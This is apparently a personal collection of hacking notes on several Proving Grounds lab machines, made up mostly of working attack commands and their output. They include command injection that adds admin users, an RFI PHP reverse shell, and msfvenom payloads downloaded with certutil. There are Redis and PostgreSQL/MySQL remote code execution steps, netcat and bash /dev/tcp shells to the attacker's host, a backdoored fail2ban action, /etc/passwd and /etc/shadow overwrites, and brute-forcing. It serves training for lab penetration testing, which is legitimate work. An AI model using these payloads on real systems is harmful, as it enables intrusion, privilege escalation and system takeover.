>curl http://localhost/?%6e%65%74%20%6c%6f%63%61%6c%67%72%6f%75%70%20%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%73%20%2f%61%64%64%20%6a%65%6d%62%6f%74
>curl http://localhost/?type C:\users\administrator\desktop\proof.txt
>curl http://localhost/?net user jembot asdasdads /add
>curl http://localhost/?net localgroup administrators /add jembot
	 <pre>The command completed successfully.
ssh jembot@192.168.96.99
>whoami
	nickel\jembot
	#We can reverse shell by uploading shell and trigger with curl






Slort ProvingGrounds
=========================================
sudo autorecon 192.168.126.53
cat tcp_4443_http_dirb.txt
cat tcp_8080_http_dirb.txt
	#webserver 4443 and 8080 are exact same
	#dirb got nothing
http://192.168.126.53:4443/dashboard/phpinfo.php
	USERNAME 		rupert
	USERPROFILE 	C:\Users\rupert 
	#got username ruppert, try to bruteforce ftp and smb and keep enumerate
crackmapexec smb 192.168.152.53 -u rupert -p /opt/rockyou.txt
hydra -l rupert -P /opt/rockyou.txt ftp://192.168.152.53
gobuster dir -u http://192.168.152.53:8080/cgi-bin/ -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --timeout 50s -t 50 -x .cgi,.ps1,.bat,.com,.vbs,.exe -b 404
gobuster dir -u http://192.168.152.53:4443/dashboard/ -w /opt/SecLists/Discovery/Web-Content/dir
	#got nothing, apparently my dirb from autorecon miss something :(
gobuster dir -u http://192.168.126.53:4443/ -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --timeout 50s -t 100 -x .php,.html,.txt,.asp,.aspx -b 500,404
	/site                 (Status: 301) [Size: 346] [--> http://192.168.126.53:4443/site/
http://192.168.126.53:4443/site/index.php?page=main.php
	#RFI windows reverse shell
	#https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php
http://192.168.126.53:4443/site/index.php?page=http://192.168.49.126/php_reverse_shell.php
rlwrap nc -lvp 443
>whoami
	slort\rupert
>netstat -ano | findstr 14147
	TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING       5328
	TCP    [::1]:14147            [::]:0                 LISTENING       5328
	#I saw filezilla, so I tought I can privesc just like Nickel, change to my windows box
	#windows tunnel windows
	#my windows box
chisel server -p 8080 -reverse
	#target box
>chisel client 192.168.159.49:8080 R:127.0.0.1:8001:127.0.0.1:80
	#I run filezilla but failed, said different version, try download another client version still fail
>cd C:\backup\
>type info.txt
	Run every 5 minutes:
	C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
	#read permision windows
>icacls backup
	BUILTIN\Users:(OI)(CI)(F)
>icacls tftp.exe
	tftp.exe BUILTIN\Users:(I)(F)
	#(F) means full access
	#binary hijack
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.126 LPORT=443 -f exe > rshell.exe
>certutil -urlcache -split -f http://192.168.49.126/rshell.exe
>copy rshell.exe TFTP.EXE
	Access is denied.
	#since access denied I moveon so quickly bcs I thought that was too easy
	#but actually I can bypass access denied from copy (?)
>move TFTP.EXE TFTP.EXE.bak
>move rshell.exe TFTP.EXE
>certutil -urlcache -split -f http://192.168.49.126/rshell.exe C:\Backup\TFTP.EXE
nc -lvp 443
>whoami
	slort\administrator






Authby ProvingGrounds
=====================================================
sudo autorecon 192.168.159.46
cat tcp_21_ftp_nmap.txt
	#ftp allow anonymous login
cat tcp_242_http_dirb.txt
	#dorb got nothing
ftp 192.168.159.46
>cd accounts
>dir
	----------   1 root     root          764 Nov 02 14:00 acc[Offsec].uac
	----------   1 root     root         1032 Nov 02 12:32 acc[anonymous].uac
	----------   1 root     root          928 Nov 02 12:41 acc[admin].uac
	#had no accss but got 3 usernames
cat user.txt
	Offsec
	anonymous
	admin
	#bruteforce ftp with nsr
hydra -L user.txt -e nsr 192.168.159.46 ftp
	21][ftp] host: 192.168.159.46   login: admin   password: admin
	#got credz admin:admin
ftp 192.168.159.46
cp .htpasswd hash.txt
john --wordlist=/opt/rockyou.txt hash.txt
	elite            (offsec)
	#got credz offsec, use for login http
http://192.168.159.46:242/
	#upload shell via ftp admin
ftp 192.168.159.46
http://192.168.159.46:242/p0wny.php
	#reverse shell with msfvenom
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.49.159 LPORT=443 -f exe > 86rshell.exe
certutil -urlcache -split -f http://192.168.49.159/86rshell.exe
86rshell.exe
nc -lvp 443
>whoami
	livda\apache
>whoami /priv
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled
>systeminfo
	OS Name:		Microsoftr Windows Server 2008 Standard
	OS Version:		6.0.6001 Service Pack 1 Build 6001
	#privesc seimpersonateprivilege x86
	#windows server 2008 standard
>JuicyPotato.exe -t * -l 1337 -p 86rshell.exe
	This version of C:\temp\JuicyPotato.exe is not compatible with the version of Windows you're running.
	#error version, download JuicyPotato x86
	#https://github.com/ivanitlearning/Juicy-Potato-x86/releases
>Juicy.Potato.x86.exe -t * -l 1337 -p 86rshell.exe .
	#error CLSID, use CLSID like Bastard Hackthebox
	#using CLSID Windows Server 2008 R2 Enterprise
	#https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/
>potato.exe -t * -l 1337 -p rshell.exe -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
nc -lvp 443
>whoami
	nt authority\system
	#after read writeup there are multiple ways to privesc
	#another privesc ms11-046, windows server 2008 standard
wget https://github.com/am0nsec/exploit/raw/master/windows/privs/MS11-046/ms11-046.c
	#I use compiled version from Devel Hackthebox
cp ../devel/ex.exe .
>certutil -urlcache -split -f http://192.168.49.159/ex.exe
>ex.exe
>whoami
	nt authority\system
	#another privesc task scheduller, windows server 2008 standard
cp /usr/share/exploitdb/exploits/windows/local/15589.wsf .
file 15589.wsf
	15589.wsf: HTML document, ASCII text, with CRLF line terminators
cat 15539.wsf
	...snap...
	a.WriteLine ("net user /add jembot asdasdasd")
	a.WriteLine ("net localgroup administrators /add jembot")
	#change user to jembot and run 
	#run wsf (Windows Script File) file on windows
>certutil -urlcache -split -f http://192.168.49.159/15589.wsf
>cscript 15589.wsf
	Microsoft (R) Windows Script Host Version 5.7
	....
>net user jembot
	#user jembot added, login with rdp
rdesktop -u jembot -p asdasdasd 192.168.159.46
	#run cmd as administrator
>type proof.txt









ClamAV ProvingGrounds
=====================================
sudo autorecon 192.168.159.42 31337
	#port smb got nothing
	#enumerate ftp
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/Names/names.txt -t 192.168.159.42
	#enumerate http
gobuster dir -u http://192.168.159.42/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --timeout 50s -t 100 -b 404
http://192.168.159.42/index.html
	01101001 01100110 01111001 01101111 01110101.....10000 0011 0000 01100010
	#convert binary to hexadecimal
	#https://www.binaryhexconverter.com/binary-to-hex-converter
echo 6966796F75646F6E7470776E6D657572616E303062 | xxd -r -p
	ifyoudontpwnmeuran00b
	#i though would be password, but that was actually rabbit hole
snmp-check 192.168.159.42 -c public
	...snap...
	clamav-milter	/usr/local/sbin/clamav-milter	--black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
cat tcp_25_smtp_nmap.txt
	25/tcp	Sendmail 8.13.4/8.13.4/Debian-3sarge3
	#exploit clamav-milter versions 0.91.2 remote root exploit
	#CVE-2007-4560
	#https://packetstormsecurity.com/search/files/?q=sendmail%208.14%20exploit
cat blackhole.pl
	print $sock "rcpt to: <nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n";
	print $sock "rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n";
	#I was running this exploit but couln't understand where is RCE thing and pass it
	#spend a day testing another port but couln't get anywhere
	#read the exploit again and understand that exploit create backdoor port 31337
perl blackhole.pl 192.168.159.42
nc 192.168.159.42 31337
>whoami
	root










Wombo ProvingGrounds
======================================
sudo autorecon 192.168.78.69
	#there are a lot of rabbit hole
	#enumerate mongodb version
nmap -sV --script "mongo* and default" -p 27017 192.168.78.69
	27017/tcp open  mongodb MongoDB 4.0.18
gobuster dir -u http://192.168.159.42/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --timeout 50s -t 100 -b 404
	#gobuster got nothing
http://192.168.78.69:8080/
	#I create user, try to upload avatar and tamper with burp but failed
cat nmapfull
	6379/tcp  open   redis      Redis key-value store 5.0.9
	#upload webshell redis, try to upload ssh key failed
redis-cli -h 192.168.78.69
>config set dir /root/.ssh/
	(error) ERR Changing directory: No such file or directory
>config set dir /var/www/html/
>config set dbfilename rce.php
>set test "<?php phpinfo(); ?>"
>save
192.168.78.69/rce.php
	#webserver can't handle php file, but file does exist
cat nmapfull
	6379/tcp  open   redis      Redis key-value store 5.0.9
	##exploit redis rce, redis rogue server metasploit
sudo msfconsole
>use linux/redis/redis_replication_cmd_exec
>set rhost 192.168.78.69 lhost 192.168.49.78 lport 80 srvhost 192.168.49.78 srvport 6378
	#srvhost and srvport are our rogue server
>run
>whoami
	root
	##manual exploit redis rogue server
https://github.com/vulhub/redis-rogue-getshell
cd RedisModulesSDK
make
python3 redis-master.py -r 192.168.78.69 -p 6379 -L 192.168.49.78 -P 6379 -f RedisModulesSDK/exp.so -c "id"
	...snap...
	uid=0(root) gid=0(root) groups=0(root)
	#manual shell
python3 redis-master.py -r 192.168.78.69 -p 6379 -L 192.168.49.78 -P 6379 -f RedisModulesSDK/exp.so -c "echo 'rooot2:$(openssl passwd -1 -salt ignite godmode):0:0:root:/root:/bin/bash' >> /etc/passwd"
	-c "echo 'rooot:$(openssl passwd -1 -salt ignite godmode):0:0:root:/root:/bin/bash' >> /etc/passwd"
ssh rooot2@192.168.78.69
>whoami
	rooot
	#manual interactive shell
	#https://github.com/Ridter/redis-rce
python redis-rce.py -r 192.168.78.69 -L 192.168.49.78 -P 6379 -f exp.so
>whoami
	root
	##redis overwrite passwd file
cat passwd.txt
	rooot:$1$ignite$RtyNB8Pmv2oiT/IbioiIH0:0:0:root:/root:/bin/bash
(echo -n "\"\n\n"; cat passwd.txt; echo -n "\n\n\"") > payload.txt
cat payload.txt | redis-cli -h 192.168.78.69 -x set payload
	OK
redis-cli -h 192.168.78.69
>get payload
	"\"\n\nrooot:$1$ignite$RtyNB8Pmv2oiT/IbioiIH0:0:0:root:/root:/bin/bash\n\n\n\""
>config set dir /etc
>config set dbfilename passwd
>config get dbfilename
>save
	OK
ssh rooot@192.168.78.69
	kex_exchange_identification: read: Connection reset by peer
	#but I can't ssh, because ssh error (?)
>cat /etc/passwd
	....
	rooot:$1$ignite$RtyNB8Pmv2oiT/IbioiIH0:0:0:root:/root:/bin/bash
	#passwd are modified
	##redis overwrite shadow file
cat shadow.txt
	root:$1$ignite$RtyNB8Pmv2oiT/IbioiIH0:18376:0:99999:7:::
(echo -n "\"\n\n"; cat shadow.txt; echo -n "\n\n\"") > payload.txt
cat payload.txt | redis-cli -h 192.168.78.69 -x set payload
	OK
redis-cli -h 192.168.78.69
>get payload
	"\"\n\nrooot:$1$ignite$RtyNB8Pmv2oiT/IbioiIH0:0:0:root:/root:/bin/bash\n\n\n\""
>config set dir /etc
>config set dbfilename shadow
>save
	OK
ssh root@192.168.78.69
#whoami
	root
	#success :)

















http://192.168.72.39/admin.php
http://192.168.72.39/admin.php?target=template_editor






PayDay ProvingGrounds
=========================================
sudo autorecon 192.168.78.39
http://192.168.78.39/
	CS-Cart
searchsploit cs cart
	#got some exploit and some of it working
	##LFI cs card
https://www.exploit-db.com/exploits/48890
http://192.168.96.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../../../etc/passwd%00
	#I can read /etc/passwd
	##RFI cs cart
https://www.exploit-db.com/exploits/1872
http://192.168.96.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=http://192.168.49.96/
	URL file-access is disabled in the server configuration
	#RFI are disabled
	##cs cart RCE file upload
https://www.exploit-db.com/exploits/48891
gobuster dir -u http://192.168.78.39/ -w /opt/directory-list-2.3-medium.txt --timeout 50s -t 100 -b 404
	/admin
http://192.168.78.39/admin
	#login default userpass admin:admin
http://192.168.78.39/admin.php?target=template_editor
	#upload file .php and temper to .phtml
curl http://192.168.72.39/skins/phprev.phtml
nc -lvp 443
>whoami
	www-data
	#enumerate using linpeas, pspy32, linux-exploit-suggester-2.pl got nothing
	#try to kernel exploit dirty cow 32 bit x86
>uname -a
	Linux payday 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
wget https://github.com/exrienz/DirtyCow/raw/master/dc32.c
gcc -pthread dc32.c -o dcow -m32
gcc -pthread dc32.c -o dcow -lcrypt -m32
wget https://github.com/0x9a/DirtyCow/raw/master/DirtyCow.c
gcc -pthread DirtyCow.c -o dcow -m32
>./dcow
	#failed got no result or shell back, or even crash
	#open up writeup turn out escalation came from user patrick, and there is no way escalate from www-data
	#updating my methodology when find some user, try to bruteforce it with hydra -e nsr then rockyou.txt
	#default user patrick:patrick
hydra -L user.txt -e nsr 192.168.78.39 ssh
	[22][ssh] host: 192.168.78.39   login: patrick   password: patrick
>su patrick
>sudo -l
	(ALL) ALL
>sudo su
#whoami
	root






Fail ProvingGrounds
===========================================
sudo autorecon 192.168.78.126
sudo nmap -p- 192.168.78.39 -Pn -sV -oN fullnmap
cat fullnmap
	873/tcp open  rsync   (protocol version 31)
	#enumerate rsync
	#https://book.hacktricks.xyz/pentesting/873-pentesting-rsync
rsync -av --list-only rsync://192.168.78.126/
	fox
nc 192.168.78.126 873
	@RSYNCD: 31.0
@RSYNCD: 31.0
#list
	fox		fox home
	#list content fox
rsync -av --list-only rsync://192.168.78.126/fox
	#dump content
rsync -av rsync://192.168.78.126/fox ./rsync_fox
	#abuse rsync upload sshkey
rsync -av .ssh  rsync://192.168.78.126/fox/.ssh
rsync -aRv .ssh  rsync://192.168.78.126/fox/
ssh fox@192.168.78.126 -i fail
>whoami
	fox
>id
	uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)
	#fail2ban privesc
>cd /etc/fail2ban/action.d/
>ls -lah
	-rw-rw-r-- 1 root fail2ban 1.5K Nov  3 09:39 iptables-multiport.conf
>cat iptables-multiport.conf
	actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
				bash -c "bash -i >& /dev/tcp/192.168.49.78/443 0>&1"
				cp /root/proof.txt /home/fox/
>cat iptables-multiport.conf
	actionban = bash -c "bash -i >& /dev/tcp/192.168.49.78/443 0>&1"
	#decide to remove iptables so when triggering I don't get banned
	#trigger fail2ban
hydra -l fox -P /opt/rockyou.txt 192.168.78.126 ssh
nc -lvp 443
#whoami
	root









Meathead ProvingGrounds
======================================
sudo autorecon 192.168.78.70
cat fullnmap
	1221/tcp open  ftp           Microsoft ftpd
	1435/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000
http://192.168.78.70/default.aspx
	Landing page Plantronics
ftp 192.168.78.70 1221
>dir
	150 Opening ASCII mode data connection.
	#ftp hang when command dir / ls, use -p (passive mode) to deal with firewall
	#https://serverfault.com/questions/244973/ftp-hangs-on-150-opening-ascii-mode-data-connection
ftp -p 192.168.78.70 1221
>get MSSQL_BAK.rar
cat names.txt | tr -d '[:space:]' | sed 's/,/\n/g' > user.txt
	#crack rar john rar
rar2john MSSQL_BAK.rar > hash.txt
john hash.txt --wordlist=/opt/rockyou.txt
	letmeinplease    (MSSQL_BAK.rar)
unrar e MSSQL_BAK.rar
	#got credz sa:EjectFrailtyThorn425
	#bruteforce with known credentials
crackmapexec mssql 192.168.78.70 -u sa -p EjectFrailtyThorn425 --port 1435
mssqlclient.py -windows-auth meathead\sa@192.168.78.70 -port 1435
	[-] ERROR(MEATHEAD\SQLEXPRESS)
	#error impacket doesn't accept username as 'sa'
	#actually after read writeup I can connect with mssqlclient.py, just remove argument -windows-auth
mssqlclient.py sa:EjectFrailtyThorn425@192.168.83.70 -port 1435
>EXEC xp_cmdshell 'dir \FTP\'
>xp_cmdshell 'whoami'
	#has better output than sqsh, but slower (?)
	#enumerate mssql
	#https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
sqsh -S 192.168.78.70:1435 -U sa -P "EjectFrailtyThorn425"
1>select @@version;
2>go
	Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64)
	#enumerate permision
1>SELECT * FROM fn_my_permissions(NULL, 'SERVER');
2>go
	#enumerate database and all database are default
1>SELECT name FROM master.sys.databases
2>go
	master,tempdb,model,msdb
	#steal ntlm hash
1>exec master.dbo.xp_dirtree '\\192.168.49.78\kali'
1>xp_dirtree '\\10.10.14.14\a';
2>go
	subdirectory----
sudo responder -I tun0
	#failed to get responder
	#after read writeup, I should enable exec command, but in actual box I can rce withput enable it
1>EXEC sp_configure 'show advanced option', '1';
1>RECONFIGURE WITH OVERRIDE;
1>EXEC sp_configure 'xp_cmdshell', 1;
	Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
1>RECONFIGURE;
1>EXEC sp_configure 'show advanced option';
	config_value: 1
	#mssql rce exec reverse shell
1>EXEC master..xp_cmdshell 'whoami'
2>go
	nt service\mssql$sqlexpress
1>EXEC xp_cmdshell 'dir \FTP\'
2>go
	#mssql reverse shell windows server x64
crackmapexec smb 192.168.78.70 -u sa -p EjectFrailtyThorn425
	[*] Windows Server 2019 Standard 17763 x64 (name:MEATHEAD)
1>EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.49.78/rev.ps1") | powershell -noprofile'
1>EXEC master..xp_cmdshell '\\192.168.49.78\asd\nc64.exe -e cmd.exe 192.168.49.78 443'
1>EXEC xp_cmdshell 'dir \FTP\'
1>EXEC xp_cmdshell '\FTP\nc64.exe 192.168.49.78 80 -e cmd.exe'
	#all failed, turned out firewall only allowed on port 80 (since I can download with powershell)
1>EXEC xp_cmdshell '\FTP\nc64.exe 192.168.49.78 80 -e cmd.exe'
2>go
rlwrap nc -lvp 80
>whoami
	nt service\mssql$sqlexpress
>whoami /priv
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled
>systeminfo
	OS Name:                   Microsoft Windows Server 2019 Standard
	OS Version:                10.0.17763 N/A Build 17763
	#pirvesc SeImpersonateToken windows server 2019 standard
>PrintSpoofer.exe -c "\FTP\nc64.exe 192.168.49.78 80 -e cmd.exe" -i
nc -lvp 80
>whoami
	nt authority\system
	#after read writeup, that printspoofer are unitended way
>whoami
	nt service\mssql$sqlexpress
>winpeas.exe > mssql-meathead-winpeas.txt
cat mssql-meathead-winpeas.txt
	Enumerating saved credentials in Registry (CurrentPass)
    HKLM\System\ControlSet001\Control\CurrentPass		:   TwilightAirmailMuck234
	#got credz TwilightAirmailMuck234
	#manual enumerate registry
>reg query HKLM /f pass /t REG_SZ /s
	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
    CurrentPass    REG_SZ    TwilightAirmailMuck234
rdesktop -u jane -p TwilightAirmailMuck234 192.168.78.70
	on desktop there are plantronics hub
	#privesc plantronic hubs 3.1.3
	#https://www.exploit-db.com/exploits/47845
>cd C:\ProgramData\Plantronics\Spokes3G
>echo %username%^|advertise^|C:\Windows\System32\cmd.exe > MajorUpgrade.config
	#failed because MajorUpgrade.config has space because echo, edit manually
>type MajorUpgrade.config
	jane|advertise|C:\Windows\System32\cmd.exe
	#and cmd.exe poped up as system
	#change to reverse shell
>whoami
	nt service\mssql$sqlexpress
>cd programdata
>dir /a
	04/27/2020  06:42 PM    <DIR>          Plantronics
>cd plantronics
>icacls spokes3g
	spokes3g BUILTIN\Users:(OI)(CI)(F)
	#In case there are no rdp access, I try reverse shell with .bat but failed, since there are argument on exe file
	#so I create reverse shell that evade antivirus (python compiled binary exe with base64 encode)
	#privesc plantronic hubs 3.1.3 reverse shell without rdp
>type MajorUpgrade.config
	jane|advertise|C:\FTP\rev-192-168-49-83-port80.exe
	#If I create file with nano or echo will fail because again there are \n at the end of character
	#better using mousepad or notepad, remember if there new line when type MajorUpgrade.config, escalate will fail
	#I try using another user but failed
	#mssql$sqlexpress|advertise|C:\FTP\rev-192-168-49-83-port80.exe
	#mssql$sqlexpress|advertise|C:\FTP\rev-192-168-49-83-port80.exe
>copy MajorUpgrade.config C:\ProgramData\Plantronics\Spokes3G
nc -lvp 80
>whoami
	nt authority\system
	#I can escalate to system without escalate to jane, in case I have write access to plantronics program data










Nibbles ProvingGrounds
======================================
sudo autorecon 192.168.83.47
cat tcp_21_ftp_nmap.txt
cat tcp_80_http_dirb.txt
	#got nothing
gobuster dir -u http://192.168.83.47/ -w /opt/directory-list-2.3-medium.txt --timeout 50s -t 100 -b 404,400
gobuster dir -u http://192.168.83.47/ -w /opt/directory-list-2.3-medium.txt --timeout 50s -t 100 -b 404,400 -x .db,.html,.txt
	#also got nothing
cat fullnmap
	5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.7
	#first time got postgresql, this repo is good to start
	#https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md
	#enumerate postgresql
sudo nmap -p5437 192.168.83.47 -Pn --script=vuln,discovery
	#default password postgresql are postgres:postgres
psql -h 192.168.83.47 -p 5437 -U postgres
>select version();
	PostgreSQL 11.7 (Debian 11.7-0+deb10u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit
	#read file postgresql
>CREATE TABLE demo(t text);
>COPY demo from '/etc/passwd';
>SELECT * FROM demo;
>select pg_read_file('/etc/passwd', 0, 5000);
	wilson:x:1000:1000:wilson,,,:/home/wilson:/bin/bash
	#write file postgresql
>DROP TABLE asd;
>CREATE TABLE asd (t TEXT);
>INSERT INTO asd(t) VALUES ('<?php @system("$_GET[c]");?>');
>COPY asd(t) TO '/var/www/html/c.php';
	could not open file "/var/www/html/cmd.php" for writing: Permission denied
	#list directory
>SHOW config_file;
>select pg_ls_dir('./');
>select pg_ls_dir('/var/www/html');
	#postgresql udf rce
	#https://afinepl.medium.com/postgresql-code-execution-udf-revisited-3b08412f47c1
	#compile binary
git clone https://github.com/sqlmapproject/udfhack/
gcc lib_postgresqludf_sys.c -I`pg_config --includedir-server` -fPIC -shared -o udf64.so
gcc -Wall -I/usr/include/postgresql/server -Os -shared lib_postgresqludf_sys.c -fPIC -o lib_postgresqludf_sys.so
	#split binary
split -b 2048 udf64.so
ls
	xaa  xab  xac  xad  xae  xaf  xag  xah  xai
	#check table largeobject
psql -h 192.168.83.47 -p 5437 -U postgres
>select loid from pg_largeobject;
	#create large object
>SELECT lo_creat(-1);
	16384
>\set c0 `base64 -w 0 xaa`
>INSERT INTO pg_largeobject (loid, pageno, data) values (16384, 0, decode(:'c0', 'base64'));
>\set c1 `base64 -w 0 xab`
>INSERT INTO pg_largeobject (loid, pageno, data) values (16384, 1, decode(:'c1', 'base64'));
>\set c2 `base64 -w 0 xac`
>INSERT INTO pg_largeobject (loid, pageno, data) values (16384, 2, decode(:'c2', 'base64'));
>\set c3 `base64 -w 0 xad`
>INSERT INTO pg_largeobject (loid, pageno, data) values (16384, 3, decode(:'c3', 'base64'));
>\set c4 `base64 -w 0 xae`
>INSERT INTO pg_largeobject (loid, pageno, data) values (16384, 4, decode(:'c4', 'base64'));
>\set c5 `base64 -w 0 xaf`
>INSERT INTO pg_largeobject (loid, pageno, data) values (16384, 5, decode(:'c5', 'base64'));
>\set c6 `base64 -w 0 xag`
>INSERT INTO pg_largeobject (loid, pageno, data) values (16384, 6, decode(:'c6', 'base64'));
>\set c7 `base64 -w 0 xah`
>INSERT INTO pg_largeobject (loid, pageno, data) values (16384, 7, decode(:'c7', 'base64'));
>\set c8 `base64 -w 0 xai`
>INSERT INTO pg_largeobject (loid, pageno, data) values (16384, 8, decode(:'c8', 'base64'));
	#export to file, and export function
>SELECT lo_export(16384, '/tmp/cmd.so');
>CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/cmd.so', 'pg_exec' LANGUAGE 'c' STRICT;
	ERROR:  incompatible library "/tmp/exp.so": version mismatch
	#got error since I compile with my postgresql library which is version 13
>SELECT sys('id');
	#after read writeup there are simple way to do it
	#https://pentesting.zeyu2001.com/proving-grounds/get-to-work/nibbles
>SELECT lo_creat(-1);
	16835
xxd -p udf64.so | tee udf.txt
x=0
while read line; do echo "select lo_put(16835, $x, '\\\x$line');" >> u.psql; x=$((x+30)); done < udf.txt
psql -h 192.168.83.47 -p 5437 -U postgres -d postgres -f u.psql
	....
	(1 row)
>SELECT lo_export(16835, '/tmp/ex.so');
	ERROR:  incompatible library "/tmp/exp.so": version mismatch
	#should google "rce postgresql 11" at the first place
	#https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
	#rce postgresql reverse shell postgresql
>CREATE TABLE cmd_exec(cmd_output text);
>COPY cmd_exec FROM PROGRAM 'id';
>SELECT * FROM cmd_exec;
>DROP TABLE IF EXISTS cmd_exec;
>COPY cmd_exec FROM PROGRAM 'which nc';
>COPY cmd_exec FROM PROGRAM 'nc 192.168.49.83 80 -e /bin/bash';
nc -lvp 80
>whoami
	postgres
>bash linpeas.sh | tee postgres-nibble-linpeas.txt
	#privesc find suid
>find . -exec /bin/sh -p \; -quit
#whoami
	root










Banzai ProvingGrounds
==================================
sudo autorecon 192.168.169.56
cat fullnmap
	21/tcp   open   ftp        vsftpd 3.0.3
	22/tcp   open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
	25/tcp   open   smtp       Postfix smtpd
	5432/tcp open   postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17
	8080/tcp open   http       Apache httpd 2.4.25
	8295/tcp open   http       Apache httpd 2.4.25 ((Debian))
http://192.168.169.56:8295
http://192.168.169.56:8080
	#there are potential username on website, list it on ser.txt and else is nothing interesting
	#enumerate user smtp
smtp-user-enum -M VRFY -U user.txt -t 192.168.169.56 -p 25 -m 1 -w 20
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/Names/names.txt -t 192.168.169.56 -p 25 -m 1 -w 20
	192.168.169.56: admin exists
	192.168.169.56: bin exists
hydra -l admin -e nsr  192.168.169.56 ftp
	[21][ftp] host: 192.168.169.56   login: admin   password: admin
ftp 192.168.169.56
>put p0wny.php
http://192.168.169.56:8295/p0wny.php
	bash -c 'bash -i >& /dev/tcp/192.168.49.169/25 0>&1'
	#reverse shell only allowed port 25
>www-data
>ss -lnt
	LISTEN     0      80	127.0.0.1:3306                                                                               *:*
>ps -aux | grep root
	root ... /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid
	#mysql run as root
>cd ~
>cat config.php
	define('DBUSER', 'root');
	define('DBPASS', 'EscalateRaftHubris123');
>mysql -u root -p
>>select @@version;
	5.7.30
>>set @asd = LOAD_FILE("/root/proof.txt");
>>select @asd;
	b518e2e6851193dd744ccf5f13c09b54
	#privesc mysql privesc udf mysql udf
	#here are compiled version
	#https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql
>uname -a
	Linux banzai 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux
wget https://github.com/rapid7/metasploit-framework/raw/master/data/exploits/mysql/lib_mysqludf_sys_64.so
ftp 192.168.169.56
>>binary
>>put lib_mysqludf_sys_64.so
>>chmod 777 lib_mysqludf_sys_64.so
>cp /var/www/html/lib_mysqludf_sys_64.so /dev/shm/
>chmod 777 /dev/shm/lib_mysqludf_sys_64.so
>mysql -u root -p
>>select @@version;
	5.7.30
>>select * from func;
	+----------+-----+------------+----------+
	| name     | ret | dl         | type     |
	+----------+-----+------------+----------+
	| sys_exec |   2 | udf2245.so | function |
	+----------+-----+------------+----------+
>>drop * from func;
>>use mysql;
>>create table asd(line blob);
>>insert into asd values(load_file('/dev/shm/lib_mysqludf_sys_64.so'));
>>select * from asd into dumpfile '/usr/lib/mysql/plugin/udf.so';
>>create function sys_exec returns integer soname 'udf.so';
>>select * from mysql.func;
>>select sys_exec("chmod 777 /etc/passwd");
>>select sys_exec("nc 192.168.49.169 25 -e /bin/bash");
nc -lvp 25
#whoami
	root









UT99 Proving Grounds
======================================
sudo autorecon 192.168.97.44
cat fullnmap
	21/tcp   open  ftp        FileZilla ftpd
	80/tcp   open  http       Apache httpd 2.4.16 (OpenSSL/1.0.1p PHP/5.6.12)
	443/tcp  open  ssl/http   Apache httpd 2.4.16 (OpenSSL/1.0.1p PHP/5.6.12)
	3306/tcp open  mysql      MySQL (unauthorized)
	6660/tcp open  irc        InspIRCd
	#after read writeup we can login to ftp as guest with no password, but no write access
ftp 192.168.97.44
>dir
	-r-xr-xr-x 1 ftp ftp       35984520 Oct 07  2015 FoxitReader706.1126_enu_Setup.exe
	-r--r--r-- 1 ftp ftp       35922892 Oct 07  2015 KB968930.msu
	-r-xr-xr-x 1 ftp ftp      114238280 Oct 07  2015 xampp-win32-5.6.12-0-VC11-installer.exe
http://192.168.97.44/public_html/
	#CPG dragonfly
searchsploit cpg
searchsploit -m 1478
	#LFI to rce exploit but install.php are deleted
http://192.168.97.44/public_html/install.php
	#404 not found
http://192.168.97.44/public_html/install.php?&newlang=../../cpg_error.log%00
	#403 Forbidden
http://192.168.97.44/public_html/install.php&newlang=cpg_error.log
	#404 Not found
http://192.168.74.44/public_html/index.php?name=News&file=article&sid=1
	Join IRC and Mumble to get more information. 
	#there are also username fluffy, daisy, kermit username, bruteforce it on login website and ftp failed
	#enumerate IRC
	#https://github.com/carlospolop/hacktricks/blob/master/pentesting/pentesting-irc.md
	#https://gist.github.com/xero/2d6e4b061b4ecbeb9f99
irssi
>/connect 192.168.97.44 6697 anonymous anonymous
>/VERSION
>/INFO
